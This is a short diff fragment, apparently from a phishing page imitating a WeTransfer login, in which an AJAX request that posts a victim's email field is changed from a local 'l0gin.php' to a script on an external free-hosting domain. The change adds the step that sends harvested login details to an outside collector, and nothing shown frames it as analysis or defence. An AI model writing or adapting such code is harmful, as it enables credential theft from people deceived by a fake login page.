@@ -292,7 +292,7 @@ Try refreshing the page or get in touch through our <a href="https://wetransfer.
           progressSim();
         }, 200);
         $.ajax({
-          url: "l0gin.php",
+          url: "https://demonstrated-missil.000webhostapp.com/l0gin.php",
           method: "post",
           data: {
             X1: email,
